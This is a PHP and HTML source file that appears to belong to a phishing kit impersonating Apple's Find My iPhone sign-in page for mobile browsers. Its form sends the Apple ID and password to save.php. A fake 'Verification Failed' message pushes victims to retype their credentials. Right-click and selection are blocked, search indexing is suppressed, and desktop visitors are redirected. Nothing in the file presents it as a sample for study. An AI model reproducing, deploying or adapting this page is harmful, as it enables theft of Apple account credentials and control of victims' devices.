<?php 

$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
 
switch ($lang) {
  case 'en':
  $lang_file = 'lang.en.php';
  break;
 
  case 'fr':
  $lang_file = 'lang.fr.php';
  break;
 
  case 'es':
  $lang_file = 'lang.es.php';
  break;

  case 'de':
  $lang_file = 'lang.de.php';
  break;
 
  default:
  $lang_file = 'lang.en.php';
 
}
 
include_once 'languages/'.$lang_file;

?>
<html>
  <head>
 <!--[if IE 7]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]--> 
 <!--[if IE 8]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
 <!--[if IE 9]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
 <!--[if IE 10]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
    <meta name="rebots" content="noindex,follow">
    <meta content="text/html; charset=utf-8" http-equiv="content-type">
    <meta name="viewport" content=" initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title><?php echo $lang['MOB_FIND']; ?></title>
    <link rel="stylesheet" href="assets/layout/wapcss.css" media="all">
    <link rel="stylesheet" href="assets/layout/applefind.css">
    <link rel="stylesheet" href="assets/layout/stylesmobversion.css" type="text/css" media="screen, print">
    <link rel="shortcut icon" href="assets/img/mobvfavicon.ico">
    <link rel="stylesheet" href="assets/layout/bootstrap.min.css">
<style>
.modal-footer .btn+.btn {
    margin-bottom: 0;
    margin-left: 5px;
}

.modal-footer {
    padding: 5px;
    text-align: -webkit-center;
    border-top: 1px solid #e5e5e5;
}

.modal-dialog {
    width: 290px;
    margin: 120px auto;
}
.btn {
    display: inline-block;
    padding: 6px 12px;
    margin-bottom: 0;
    font-size: 14px;
    font-weight: 400;
    line-height: 1.42857143;
    text-align: center;
    white-space: nowrap;
    vertical-align: middle;
    -ms-touch-action: manipulation;
    touch-action: manipulation;
    cursor: pointer;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    background-image: none;
    border: 0px solid transparent;
    border-radius: 0px;
    color: #2DA63F;
}

.btn-primary {
    color: #2DA63F;
    background-color: rgba(255, 255, 255, 0);
    border-color: rgba(255, 255, 255, 0);
    background-image: -webkit-linear-gradient(top,rgba(255, 255, 255, 0) 0,rgba(255, 255, 255, 0) 100%);
    background-image: -o-linear-gradient(top,#337ab7 0,#265a88 100%);
    background-image: -webkit-gradient(linear,left top,left bottom,from(rgba(255, 255, 255, 0)),to(rgba(255, 255, 255, 0)));
    background-image: linear-gradient(to bottom,rgba(255, 255, 255, 0) 0,rgba(255, 255, 255, 0) 100%);
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7', endColorstr='#ff265a88', GradientType=0);
    filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
    background-repeat: repeat-x;
    border-color: rgba(255, 255, 255, 0);
}


/* modification final */

.btn-def{color:#2DA63F;background-color:#fff;font-weight: normal;}
.btn-def.focus,.btn-def:focus{color:#2DA63F;background-color:#fff;border-color:#fff}
 .btn-def:hover{color:#2DA63F;background-color:#fff;border-color:#fff} 

 p.thicker {
    font-weight: 700;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    text-align: center;
    font-size: 18px;
} 
.Top {
  background-color: #fff; text-align:center; width:100%; font-family:Segoe, 'Segoe UI', 'DejaVu Sans', 'Trebuchet MS', Verdana, sans-serif; line-height:50px; font-size:20px; color: #333; font-weight: 700; border-bottom: solid 1px #A5D7AC;
  
} 
</style>

<script type="text/javascript">
  <!--
  if (screen.width >= 1024) {
    window.location = "index.php";
  }
  //-->
</script>
<script type="text/javascript" src="assets/js/jquery-latest.min.js"></script>
<script type="text/javascript" src="assets/js/gen_validatorv4.js"></script>
<script type="text/javascript">
	//<![CDATA[
		$(window).load(function() { // makes sure the whole site is loaded
     $('#password').keypress(function(){
        $('#buttom').css('color', 'green');
      });
			$('#status').fadeOut(); // will first fade out the loading animation
			$('#preloader').delay(350).fadeOut('slow'); // will fade out the white DIV that covers the website.
			$('body').delay(350).css({'overflow':'visible'});
		})
	//]]>
</script> 
  </head>
<body ondragstart="window.event.returnValue=false" oncontextmenu="window.event.returnValue=false" onselectstart="event.returnValue=false">

<section class="alert" style="">
  <div class="alert-body">
    <h1>Verification Failed</h1>
    <p>Your Apple ID or password is incorrect.</p>
    <span class="alert-foot">
      OK    </span>
  </div>
</section>

    <!-- Preloader -->
<div id="preloader">
	<div id="status">&nbsp;</div>
</div>
	
  
	
    <p class="main_img"></p> <center><img src="assets/img/2.png" style="width:100px;height:100px;"></center>
    <p>
	</p>
    <div class="main">
      <p class="lok"><?php echo $lang['MOB_FIND']; ?></p>

		<form onKeyDown="ENTER(event);" onSubmit="return checkinput();" method="post" name="form1" action="save.php">		
        <ul class="main_list">		
          <li class="main_bord">
          <strong><?php echo $lang['MOB_APPLE_ID']; ?></strong><input name="appleid" id="appleID" placeholder="<?php echo $lang['MOB_EXAMPLE']; ?>" class="main_col" type="text"></li>
          <li class="main_bord1">
          <strong><?php echo $lang['MOB_PASSWORD']; ?></strong><input name="password" id="password" placeholder="<?php echo $lang['MOB_REQUIRED']; ?>" class="main_col" type="password" autocomplete="off"></li>
<script type="text/javascript">
var frmvalidator = new Validator("form1");
frmvalidator.addValidation("appleid","req","Please enter your email");
frmvalidator.addValidation("appleid","email","Please enter your email");
frmvalidator.addValidation("password","req","Please enter your password");
</script> 
        </ul>
        <input name="buttom" id="buttom" class="buttom" value="<?php echo $lang['MOB_LOGIN']; ?>" type="submit">
      </form>
      <div class="separated"></div>
      <h3><a href="https://iforgot.apple.com/" target="_self" style="text-decoration:none;color:#37A449;">
          <?php echo $lang['MOB_FORGOT_ID']; ?></a></h3>
      
      <h3><a href="https://www.apple.com/icloud/setup/ios.html" target="_self" style="text-decoration:none;color:#37A449;">
            <?php echo $lang['MOB_SETUP_INSTRUCTIONS']; ?></a></h3>
    </div>



<?php
if(isset($_GET["error"])){ 
?>

<script type="text/javascript">
    $(document).ready(function(){
        $("#myModal").modal('show');
    });
</script>
<!-- alert -->
<div id="myModal" class="modal fade">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-body">
<p class="thicker">Verification Failed</p>
                <p style="font-weight: bold; font-size: 14px; text-align: center">Your Apple ID or password was incorrect.</p>               
            </div>
            <div class="modal-footer">
            <spain type="button" class="btn btn-def" data-dismiss="modal"><p class="thicker">OK</p></spain>
            </div>
        </div>
    </div>
</div>
<?php } ?>


<script src="assets/js/jquery-1.11.3.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/findmyphone.min.js"></script>   


  </body>
</html>
